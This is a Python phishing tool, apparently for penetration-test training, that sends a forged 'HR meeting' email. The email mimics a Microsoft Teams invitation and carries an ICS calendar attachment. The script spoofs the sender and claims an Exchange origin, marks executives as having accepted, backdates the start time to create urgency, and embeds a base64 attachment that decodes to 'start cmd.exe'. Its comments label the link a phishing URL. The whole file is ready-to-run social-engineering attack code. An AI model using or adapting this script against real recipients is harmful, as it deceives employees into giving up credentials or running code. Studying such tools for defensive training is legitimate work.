```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# ─── Email settings ───────────────────────────────────────────────────────────
EMAIL_SUBJECT = "HR Meeting"

# ─── Event settings ───────────────────────────────────────────────────────────
EVENT_SUMMARY  = "HR meeting"
ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES      = ["ceo@corp1.com", "cto@corp1.com"]

# ─── Email body text (plain paragraph inside HTML template) ───────────────────
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent
company-wide changes and policies. Your attendance is highly encouraged as we
will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions
or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

# ─── Hardcoded HTML template ──────────────────────────────────────────────────
# Placeholders:
#   {EVENT_TEXT}  → EVENT_TEXT 変数（会議説明文）
#   {EVENT_URL}   → コマンドライン引数 event_url（フィッシングURL）
EMAIL_TEMPLATE = """\
<html>
<body>
<p class=MsoNormal style='background:white'>
  <span style='color:black'>{EVENT_TEXT}<u1:p>&nbsp;<o:p></o:p></span></u1:p>
</p>
<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    ________________________________________________________________________________
  </span>
  <span style='mso-fareast-font-family:"Times New Roman";color:black'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-size:18.0pt;font-family:"Segoe UI",sans-serif;color:#252424'>
    Microsoft Teams meeting
  </span>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <b><span style='font-size:10.5pt;font-family:"Segoe UI",sans-serif;color:#252424'>
    Join on your computer or mobile app
  </span></b>
  <b><span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <u1:p>&nbsp;</u1:p>
  </span></b>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <a href="{EVENT_URL}" target="_blank">
      <span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>
        Click here to join the meeting
      </span>
    </a>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <a href="https://aka.ms/JoinTeamsMeeting" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Learn More</span>
    </a>
    |
    <a href="{EVENT_URL}" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Meeting options</span>
    </a>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    <span style='opacity:.36'>
      ________________________________________________________________________________
    </span>
  </span>
  <span style='mso-fareast-font-family:"Times New Roman";color:black'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
</body>
</html>
"""

# ─── Hardcoded ICS template ───────────────────────────────────────────────────
# Placeholders:
#   {DTSTAMP}         → 作成タイムスタンプ (YYYYMMDDTHHMMSSz)
#   {DTSTART}         → 会議開始時刻
#   {DTEND}           → 会議終了時刻
#   {ORGANIZER_NAME}  → ORGANIZER_NAME 変数
#   {ORGANIZER_EMAIL} → コマンドライン引数 sender_email
#   {DESCRIPTION}     → コマンドライン引数 event_url（フィッシングURL）
#   {SUMMARY}         → EVENT_SUMMARY 変数
#   {ATTENDEES}       → generate_attendees() の出力
ICS_TEMPLATE = """\
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\\c3RhcnQgY21kLmV4ZQo=
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
"""


# ─── Template functions ───────────────────────────────────────────────────────

def prepare_template(event_url):
    """HTMLテンプレートのプレースホルダーを置換して返す"""
    return EMAIL_TEMPLATE.format(
        EVENT_TEXT=EVENT_TEXT,
        EVENT_URL=event_url
    )


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    """ICSテンプレートのプレースホルダーを置換して返す"""
    return ICS_TEMPLATE.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )


def generate_attendees():
    """ATTENDEES リストからICS用ATTENDEEブロックを生成する"""
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;"
            "PARTSTAT=ACCEPTED;RSVP=FALSE\r\n"
            " ;CN={a};X-NUM-GUESTS=0:\r\n"
            " mailto:{a}".format(a=attendee)
        )
    return "\r\n".join(attendees)


# ─── Send email ───────────────────────────────────────────────────────────────

def send_email(smtp_server, sender_email, to, event_url):
    print("[*] Sending email to: " + to)

    # タイムスタンプ・会議時刻の計算（UTC基準）
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart   = datetime.datetime.now()
    dtoff      = datetime.timedelta(minutes=utc_offset + 5)  # 5分前開始に見せる
    duration   = datetime.timedelta(hours=1)                 # 1時間の会議
    ddtstart   = ddtstart - dtoff
    dtend      = ddtstart + duration

    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend   = dtend.strftime("%Y%m%dT%H%M%SZ")

    # テンプレート展開
    ics        = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    # MIMEメッセージ構築
    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date']     = formatdate(localtime=True)
    msg['Subject']  = EMAIL_SUBJECT
    msg['From']     = sender_email
    msg['To']       = to

    part_email = MIMEText(email_body, "html")
    part_cal   = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    # ICSを添付ファイルとしても付与
    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % "invite.ics")
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % "invite.ics")

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    # SMTP送信
    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()
    print("[+] Email sent successfully.")


# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 fakeics.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        print("Example: python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151")
        sys.exit(1)

    smtp_server      = sys.argv[1]
    sender_email     = sys.argv[2]
    recipient_email  = sys.argv[3]
    event_url        = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)


if __name__ == "__main__":
    main()
```